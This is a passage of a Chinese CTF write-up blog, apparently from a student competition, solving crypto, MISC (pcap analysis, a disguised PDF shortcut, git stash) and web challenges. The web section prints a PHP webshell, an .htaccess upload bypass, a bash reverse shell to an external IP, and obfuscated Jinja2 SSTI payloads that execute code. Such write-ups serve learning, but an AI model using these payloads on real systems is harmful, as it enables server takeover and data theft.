+</span></span><span class="line"><span class="cl"><span class="c1"># G = E.random_point()</span>
+</span></span><span class="line"><span class="cl"><span class="n">my_private_key</span> <span class="o">=</span> <span class="mi">2549545681219766023689977461986014915946503806253877534915175093306317852773</span>
+</span></span><span class="line"><span class="cl"><span class="n">sender_public_key</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shared</span> <span class="o">=</span> <span class="n">my_private_key</span><span class="o">*</span><span class="n">sender_public_key</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">shared</span><span class="o">.</span><span class="n">xy</span><span class="p">()[</span><span class="mi">0</span><span class="p">]))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出 <code>key</code> 的值为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xf7\x1d\x06\xa8\xd1\xeb\xa2\xfa</span><span class="s2">7</span><span class="se">\xf3\x87</span><span class="s2">q&#39;H.&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>于是可解密得到 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ciphretext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;d151c04c645c3e2a8d3f1ae44589ef20&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xf7\x1d\x06\xa8\xd1\xeb\xa2\xfa</span><span class="s2">7</span><span class="se">\xf3\x87</span><span class="s2">q&#39;H.&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphretext</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出即为 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{ell1ptic_curv3_i5_be4ut1ful_right#4DF17ABE}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="references-1" class="headerLink">
+    <a href="#references-1" class="header-mark"></a>References</h4><ul>
+<li><a href="https://zhuanlan.zhihu.com/p/66794410" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/66794410</a></li>
+<li>谷利则, 郑世慧, 杨义先. 现代密码学教程（第2版）[M]. 北京：北京邮电大学出版社, 2015:202-205.</li>
+</ul>
+<h2 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>MISC</h2><h3 id="最后的流量分析" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e%e7%9a%84%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90" class="header-mark"></a>最后的流量分析</h3><p>使用 Wireshark 打开 <code>sqli.pcap</code> 文件，筛选语句为 <code>http.response.code==200</code>. 查看第一条记录的 <code>Line-based text data</code>，选中记录，然后按住下箭头键用人类强大的眼睛疯狂扫描。</p>
+<p>很快，我们就发现有什么东西闪（变化）了一下，定位到那条记录，其 payload 为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">if</span><span class="p">((</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="p">(</span><span class="nb">text</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">wfy_comments</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="n">id</span><span class="o">=</span><span class="mi">100</span><span class="p">)),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">),</span><span class="mi">100</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">好耶！你有这条来自f1ag_is_here条留言
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以我们修改筛选语句为 <code>data-text-lines contains &quot;f1ag_is_here&quot;</code>，然后手录出 flag 吧！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{c8cbb04a-8663-4ee2-9449-349f1ee83e11}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="奇怪的-pdf" class="headerLink">
+    <a href="#%e5%a5%87%e6%80%aa%e7%9a%84-pdf" class="header-mark"></a>奇怪的 PDF</h3><p>拿到文件，打开压缩包，发现文件名为 <code>strange2.pdf.lnk</code>，观察其文件大小不像是个快捷方式，于是尝试去掉 <code>.lnk</code> 后缀名后解压，但实践表明这并不是一个 PDF 文件。</p>
+<p>所以直接放进 010 Editor 查看 Hex.</p>
+<p>发现文件开始部分存在一些命令语句（为了方便查看我用记事本打开了）：</p>
+<p><a class="lightgallery" href="https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp" title="strange.pdf 以文本方式打开" data-thumbnail="https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp" data-sub-html="<h2>strange.pdf 以文本方式打开</h2>">
+        <img
+            
+            loading="lazy"
+            src="https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp"
+            srcset="https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp, https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp 1.5x, https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp 2x"
+            sizes="auto"alt="https://image.cnily.top/blog/screenshot/strange_pdf_lnk_txt.png?imageMogr2/format/webp">
+    </a></p>
+<p>其后是一长串 Printable Text，猜测是Base64编码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TVNDRgDAAADWPw0AAAAAAEwA...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>复制开头的一部分解码试试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">MSCF\x00À\x00\x00Ö?\r\x00\x00...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>搜索 <code>MSCF</code>，得知是 CAB 文件的文件头。</p>
+<p>将全部 Base64 字符串复制进一个 TXT 文件后，使用 Python 脚本进行解码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./strangePDF.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">decoded</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./stangePDF.cab&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解码后打开 <code>stangePDF.cab</code>，报错。</p>
+<p>重新省视文件开始部分的命令语句，发现字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">findstr.exe <span class="s2">&#34;TVNDRgAAAA&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对 Base64 字符串全局搜索 <code>TVNDRgAAAA</code>，仅发现一处匹配，从 <code>TVNDRgAAAA</code>开始截取 Base64 编码字符串（忽略前面的一长串）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">TVNDRgAAAAAqQA8AAAAAACwAAAAAAAAAAwEBAAMAAABRDQAAhAAAACIAAQDRAAAAAAAAAAAATVUudSAAOXNPWE42THRmMGFmZTcuanMAHwAAANEAAAAAAE1VTHMgAGZsYWcudHh0ANSLEADwAAAAAABNVZZ1IABzdHJhbmdlMi5wZGYA5hY3PDd7AIBDS5X7A5RlTdMuipa7bNu2bdu2bXbZtrps2122baPLtnnqfT/+/...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对筛选后的 Base64 字符串使用同样的 Python 脚本解码，再次打开 <code>strangePDF.cab</code>，成功打开，发现三个文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">9sOXN6Ltf0afe7.js
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span><span class="line"><span class="cl">strange2.pdf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打开 <code>flag.txt</code> 得到 flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{It_1s_a_fak3_but_r3al_PDF}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>打开 <code>strange2.pdf</code>，让我们感谢出题人赠送的《欺骗的艺术》！</p>
+<h3 id="yesec-no-drumsticks-5" class="headerLink">
+    <a href="#yesec-no-drumsticks-5" class="header-mark"></a>Yesec no drumsticks 5</h3><p>压缩包内是一个 git，<code>git -log</code> 发现版本挺多，于是使用 <code>git reset --hard</code> 逐步回退版本，查看 <code>flag.txt</code> 内容，只找到一个假的 flag. 故此路不通。</p>
+<p>重新解压压缩包，更换思路。</p>
+<p>代码仓库、暂存区和工作区内已修改的文件均可直接被查看到。</p>
+<p>Git 中有一个用于藏匿代码的指令 <code>stash</code>.</p>
+<p>查看缓存区：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git stash list
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试撤销，恢复缓存区：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git stash pop
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再次查看 <code>flag.txt</code> 得到 flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{Yesec#1s#c@ibi}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>WEB</h2><h3 id="give-me-your-photo-plz" class="headerLink">
+    <a href="#give-me-your-photo-plz" class="header-mark"></a>Give me your photo PLZ</h3><p>我们按照网页的要求上传一张图片，发现图片被上传到网站的 <code>/upload</code> 目录中。</p>
+<p>猜测是利用文件上传功能上传木马。我们随便传个 cpp 文件上去发现是上传成功的，但是随便上传一个 php 上去会返回 <code>上传木马可不是好习惯～～～</code>.</p>
+<p>先构造一个木马文件，再想办法绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># webshell.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用 Burp 或 Fiddler 改包，修改 <code>Content-Type</code> 为 <code>image/jpeg</code> 后放行，但还是不成功。但是仅修改 <code>filename</code> 却可以，得知过滤机制为检测文件后缀名。</p>
+<p><a class="lightgallery" href="https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp" title="Burp Try 1" data-thumbnail="https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp" data-sub-html="<h2>Burp Try 1</h2>">
+        <img
+            
+            loading="lazy"
+            src="https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp"
+            srcset="https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp, https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp 1.5x, https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp 2x"
+            sizes="auto"alt="https://image.cnily.top/blog/screenshot/give_me_your_photo_1.png?imageMogr2/format/webp">
+    </a></p>
+<p><a class="lightgallery" href="https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp" title="Burp Try 2" data-thumbnail="https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp" data-sub-html="<h2>Burp Try 2</h2>">
+        <img
+            
+            loading="lazy"
+            src="https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp"
+            srcset="https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp, https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp 1.5x, https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp 2x"
+            sizes="auto"alt="https://image.cnily.top/blog/screenshot/give_me_your_photo_2.png?imageMogr2/format/webp">
+    </a></p>
+<p>修改文件后缀为 <code>pht</code> <code>phtml</code> <code>pHp</code> 等都无法绕过，使用 Hex 再在 <code>.php</code> 后面插入 <code>%0A</code> 字符后也不管用。</p>
+<p><a class="lightgallery" href="https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp" title="Burp Try 3" data-thumbnail="https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp" data-sub-html="<h2>Burp Try 3</h2>">
+        <img
+            
+            loading="lazy"
+            src="https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp"
+            srcset="https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp, https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp 1.5x, https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp 2x"
+            sizes="auto"alt="https://image.cnily.top/blog/screenshot/give_me_your_photo_3.png?imageMogr2/format/webp">
+    </a></p>
+<p>尝试利用解析绕过。</p>
+<p>构造文件 <code>.htaccess</code>. 这将会使得 Apache 将 JPG 文件以 PHP 文件的方式解析：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- .htaccess --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;ifModule</span> <span class="err">mime_module</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">AddHandler php5-script .jpg
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ifModule&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传成功！</p>
+<p>再访问 <code>/upload/webshell.jpg</code>, 发现已经显示为 php.</p>
+<p>我们不妨再上传一个 <code>bash.png</code> 内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i <span class="p">&amp;</span>&gt; /dev/tcp/47.97.152.130/54188 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后在主控机上监听端口 <code>nc -lvp 54188</code>，在 WebShell 上传 payload 执行该文件拿到 shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell=bash bash.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>主控机上已拿到 shell，但根目录下未发现 flag，尝试查看环境变量，执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@out:/$ <span class="nb">export</span> -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到其中一条为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">declare</span> -x <span class="nv">FLAG</span><span class="o">=</span><span class="s2">&#34;flag{157d77e1-0d53-42db-a9d6-2b98e4cacec0}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>获得 flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{4a7e06cd-29ab-491c-a1ff-478427e3b92a}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="babyssti_three" class="headerLink">
+    <a href="#babyssti_three" class="header-mark"></a>BabySSTI_Three</h3><p>使用 pyload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">166</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#39;</span><span class="n">os</span><span class="s1">&#39;).listdir(&#39;</span><span class="o">/</span><span class="s1">&#39;)&#39;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对字符串进行 ASCII 编码绕过，有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x62\x61\x73\x65\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">]()[</span><span class="mi">166</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x65\x76\x61\x6c</span><span class="s1">&#39;</span><span class="p">](</span><span class="s1">&#39;</span><span class="se">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x6c\x69\x73\x74\x64\x69\x72\x28\x27\x2f\x27\x29</span><span class="s1">&#39;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>网页端得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">[</span><span class="s1">&#39;bin&#39;</span><span class="p">,</span> <span class="s1">&#39;boot&#39;</span><span class="p">,</span> <span class="s1">&#39;dev&#39;</span><span class="p">,</span> <span class="s1">&#39;etc&#39;</span><span class="p">,</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span> <span class="s1">&#39;lib&#39;</span><span class="p">,</span> <span class="s1">&#39;lib64&#39;</span><span class="p">,</span> <span class="s1">&#39;media&#39;</span><span class="p">,</span> <span class="s1">&#39;mnt&#39;</span><span class="p">,</span> <span class="s1">&#39;opt&#39;</span><span class="p">,</span> <span class="s1">&#39;proc&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;run&#39;</span><span class="p">,</span> <span class="s1">&#39;sbin&#39;</span><span class="p">,</span> <span class="s1">&#39;srv&#39;</span><span class="p">,</span> <span class="s1">&#39;sys&#39;</span><span class="p">,</span> <span class="s1">&#39;tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;usr&#39;</span><span class="p">,</span> <span class="s1">&#39;var&#39;</span><span class="p">,</span> <span class="s1">&#39;flag_in_h3r3_52daad&#39;</span><span class="p">,</span> <span class="s1">&#39;.dockerenv&#39;</span><span class="p">,</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span> <span class="s1">&#39;start.sh&#39;</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 flag 的文件路径为 <code>/flag_in_h3r3_52daad</code>，再构造 payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__base__&#39;</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">166</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;open(</span><span class="se">\&#39;</span><span class="s1">/flag_in_h3r3_52daad</span><span class="se">\&#39;</span><span class="s1">).read()&#39;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
